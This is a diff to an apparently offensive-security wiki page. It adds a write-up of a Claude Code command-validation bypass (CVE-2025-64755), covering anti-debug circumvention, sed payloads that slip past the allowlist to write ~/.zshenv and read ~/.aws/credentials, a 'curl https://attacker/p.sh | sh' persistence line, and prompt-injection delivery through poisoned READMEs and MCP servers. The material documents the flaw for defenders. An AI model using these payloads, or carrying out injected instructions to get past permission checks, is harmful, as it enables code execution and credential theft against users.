@@ -159,6 +159,32 @@ See also – operational abuse and detection of local AI CLI/MCP clients:
 ../generic-methodologies-and-resources/phishing-methodology/ai-agent-abuse-local-ai-cli-tools-and-mcp.md
 {{#endref}}
 
+### LLM Agent Command Validation Bypass (Claude Code sed DSL RCE – CVE-2025-64755)
+
+SpecterOps detailed how Claude Code ≤2.0.30 could be driven into arbitrary file write/read through its `BashCommand` tool even when users relied on the built-in allow/deny model to protect them from prompt-injected MCP servers.
+
+#### Reverse‑engineering the protection layers
+- The Node.js CLI ships as an obfuscated `cli.js` that forcibly exits whenever `process.execArgv` contains `--inspect`. Launching it with `node --inspect-brk cli.js`, attaching DevTools, and clearing the flag at runtime via `process.execArgv = []` bypasses the anti-debug gate without touching disk.
+- By tracing the `BashCommand` call stack, researchers hooked the internal validator that takes a fully-rendered command string and returns `Allow/Ask/Deny`. Invoking that function directly inside DevTools turned Claude Code’s own policy engine into a local fuzz harness, removing the need to wait for LLM traces while probing payloads.
+
+#### From regex allowlists to semantic abuse
+- Commands first pass a giant regex allowlist that blocks obvious metacharacters, then a Haiku “policy spec” prompt that extracts the base prefix or flags `command_injection_detected`. Only after those stages does the CLI consult `safeCommandsAndArgs`, which enumerates permitted flags and optional callbacks such as `additionalSEDChecks`.
+- `additionalSEDChecks` tried to detect dangerous sed expressions with simplistic regexes for `w|W`, `r|R`, or `e|E` tokens in formats like `[addr] w filename` or `s/.../../w`. BSD/macOS sed accepts richer syntax (e.g., no whitespace between the command and filename), so the following stay within the allowlist while still manipulating arbitrary paths:
+
+```bash
+echo 'runme' | sed 'w /Users/victim/.zshenv'
+echo echo '123' | sed -n '1,1w/Users/victim/.zshenv'
+echo 1 | sed 'r/Users/victim/.aws/credentials'
+```
+
+- Because the regexes never match these forms, `checkPermissions` returns **Allow** and the LLM executes them without user approval.
+
+#### Impact and delivery vectors
+- Writing to startup files such as `~/.zshenv` yields persistent RCE: the next interactive zsh session executes whatever payload the sed write dropped (e.g., `curl https://attacker/p.sh | sh`).
+- The same bypass reads sensitive files (`~/.aws/credentials`, SSH keys, etc.) and the agent dutifully summarizes or exfiltrates them via later tool calls (WebFetch, MCP resources, etc.).
+- An attacker only needs a prompt-injection sink: a poisoned README, web content fetched through `WebFetch`, or a malicious HTTP-based MCP server can instruct the model to invoke the “legitimate” sed command under the guise of log formatting or bulk editing.
+
+
 ### Flowise MCP Workflow RCE (CVE-2025-59528 & CVE-2025-8943)
 
 Flowise embeds MCP tooling inside its low-code LLM orchestrator, but its **CustomMCP** node trusts user-supplied JavaScript/command definitions that are later executed on the Flowise server. Two separate code paths trigger remote command execution:
@@ -204,5 +230,7 @@ The command-template variant exercised by JFrog (CVE-2025-8943) does not even ne
 - [GHSA-3gcm-f6qx-ff7p / CVE-2025-59528 – Flowise CustomMCP JavaScript code injection](https://github.com/advisories/GHSA-3gcm-f6qx-ff7p)
 - [GHSA-2vv2-3x8x-4gv7 / CVE-2025-8943 – Flowise custom MCP command execution](https://github.com/advisories/GHSA-2vv2-3x8x-4gv7)
 - [JFrog – Flowise OS command remote code execution (JFSA-2025-001380578)](https://research.jfrog.com/vulnerabilities/flowise-os-command-remote-code-execution-jfsa-2025-001380578)
+- [CVE-2025-54136 – MCPoison Cursor IDE persistent RCE](https://research.checkpoint.com/2025/cursor-vulnerability-mcpoison/)
+- [An Evening with Claude (Code): sed-Based Command Safety Bypass in Claude Code](https://specterops.io/blog/2025/11/21/an-evening-with-claude-code/)
 
 {{#include ../banners/hacktricks-training.md}}
